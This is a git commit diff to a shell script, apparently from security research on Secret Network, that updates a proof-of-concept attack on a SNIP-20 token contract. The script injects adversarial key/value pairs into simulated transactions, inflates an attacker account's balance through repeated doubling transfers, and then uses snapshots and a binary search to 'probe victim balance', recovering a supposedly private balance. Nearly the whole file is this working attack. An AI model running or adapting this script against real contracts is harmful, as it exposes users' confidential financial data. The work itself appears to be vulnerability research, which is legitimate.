31063511898810ec5b8a545c26c0fff2bd7a64ce
Sylvain Bellemare <sbellem@gmail.com>
2023-02-02 20:04:12 -0600

    (sbellem) squash commits
    * Remove cosmos-sdk
    * Make snip20 demo work with v1.7.0-rc.2 code
    * Parametrize the location of the snip20 backup dir

--- hacking/scripts/test_balance.sh
+++ hacking/scripts/test_balance.sh
@@ -4,9 +4,10 @@ set -x
 set -e
 
 source ./scripts/demo_utils.sh
+source ./scripts/local_test_params.sh
 
-CONTRACT=$(cat $BACKUP/contractAddress.txt)
-CODEHASH=$(cat $BACKUP/codeHash.txt)
+CONTRACT_ADDRESS=$(cat $BACKUP/contractAddress.txt)
+CODE_HASH=$(cat $BACKUP/codeHash.txt)
 
 snapshot_uniq_label=$(date '+%Y-%m-%d-%H:%M:%S')
 set_snapshot "${snapshot_uniq_label}-start"
@@ -21,15 +22,16 @@ touch $BACKUP/adv_value
 
 
 # get boosting key and value
-generate_and_sign_transfer $CONTRACT $CODEHASH $ACC1 $ACC0 1 snip20_getkey
+generate_and_sign_transfer $ACC1 $ACC0 1 snip20_getkey
 rm -f $BACKUP/kv_store
 touch $BACKUP/kv_store
 simulate_tx snip20_getkey
 res=$(cat $BACKUP/simulate_result)
 echo $res
-tag=$(sed '3q;d' $BACKUP/kv_store)
-key=${tag:6:64} 
-value=${tag:81:128} 
+tag=$(sed '5q;d' $BACKUP/kv_store)
+key=${tag:6:-1}
+tag=$(sed '6q;d' $BACKUP/kv_store)
+value=${tag:8:-1}
 
 # boost balance of ACC1
 echo $key > $BACKUP/backup_adv_key
@@ -39,7 +41,7 @@ set_snapshot "${snapshot_uniq_label}-boost"
 amount=10000
 
 for i in {1..114}; do
-    generate_and_sign_transfer $CONTRACT $CODEHASH $ACC1 $ACC0 $amount snip20_boost_1
+    generate_and_sign_transfer $ACC1 $ACC0 $amount snip20_boost_1
     cp -f $BACKUP/backup_adv_key $BACKUP/adv_key
     cp -f $BACKUP/backup_adv_value $BACKUP/adv_value
 
@@ -48,7 +50,7 @@ for i in {1..114}; do
     echo $res1
 
     amount=$(echo $(python -c "print ${amount}*2"))
-    generate_and_sign_transfer $CONTRACT $CODEHASH $ACC0 $ACC1 $amount snip20_boost_2
+    generate_and_sign_transfer $ACC0 $ACC1 $amount snip20_boost_2
     rm -f $BACKUP/adv_key
     rm -f $BACKUP/adv_value
     touch $BACKUP/adv_key
@@ -59,16 +61,16 @@ for i in {1..114}; do
     simulate_tx snip20_boost_2
     res2=$(cat $BACKUP/simulate_result)
     echo $res2
-    tag=$(sed '2q;d' $BACKUP/kv_store)
+    tag=$(sed '4q;d' $BACKUP/kv_store)
     echo $tag
-    value=${tag:81:128} 
+    value=${tag:8:-1} 
     echo $value > $BACKUP/backup_adv_value
 
     echo $amount $i
 done
 
 amount=$(echo $(python -c "print 2**128-1-${amount}"))
-generate_and_sign_transfer $CONTRACT $CODEHASH $ACC0 $ACC1 $amount snip20_boost_1
+generate_and_sign_transfer $ACC0 $ACC1 $amount snip20_boost_1
 cp -f $BACKUP/backup_adv_key $BACKUP/adv_key
 cp -f $BACKUP/backup_adv_value $BACKUP/adv_value
 
@@ -78,15 +80,16 @@ echo $res3
 
 # probe victim balance
 amount=$(echo $(python -c "print 2**128-1"))
-generate_and_sign_transfer $CONTRACT $CODEHASH $ACC1 $ACC0 $amount snip20_getkey
+generate_and_sign_transfer $ACC1 $ACC0 $amount snip20_getkey
 rm -f $BACKUP/kv_store
 touch $BACKUP/kv_store
 simulate_tx snip20_getkey
 res4=$(cat $BACKUP/simulate_result)
 echo $res4
-tag=$(sed '2q;d' $BACKUP/kv_store)
-key=${tag:6:64} 
-value=${tag:81:128} 
+tag=$(sed '3q;d' $BACKUP/kv_store)
+key=${tag:6:-1}
+tag=$(sed '4q;d' $BACKUP/kv_store)
+value=${tag:8:-1}
 
 echo $key > $BACKUP/backup_adv_key
 echo $value > $BACKUP/backup_adv_value
@@ -102,7 +105,7 @@ while [ $(echo $(python -c "print ${hi}-${lo}")) != "0" ]; do
     cp -f $BACKUP/backup_adv_value $BACKUP/adv_value
     set_snapshot "${snapshot_uniq_label}-${cnt}"
     
-    generate_and_sign_transfer $CONTRACT $CODEHASH $ACC1 $ACC2 $midv snip20_adv
+    generate_and_sign_transfer $ACC1 $ACC2 $midv snip20_adv
     
     simulate_tx snip20_adv
     res=$(cat $BACKUP/simulate_result)
@@ -113,6 +116,3 @@ while [ $(echo $(python -c "print ${hi}-${lo}")) != "0" ]; do
 done
 
 echo $(python -c "print 2**128-1-${lo}")
-
-
-
